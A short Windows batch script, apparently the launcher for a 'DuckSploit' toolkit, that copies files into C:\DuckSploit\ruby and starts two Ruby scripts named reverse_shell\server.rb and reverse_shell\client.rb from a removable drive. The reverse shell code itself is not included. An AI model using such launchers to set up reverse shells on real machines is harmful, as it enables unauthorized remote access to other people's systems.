@echo off

mkdir C:\DuckSploit\ruby\

copy commands\*.* C:\DuckSploit\ruby\

cls

start cmd.exe /C "ruby E:\DUCKSPLOIT\ruby\reverse_shell\server.rb&pause"

start cmd.exe /C "ruby E:\DUCKSPLOIT\ruby\reverse_shell\client.rb&pause"


exit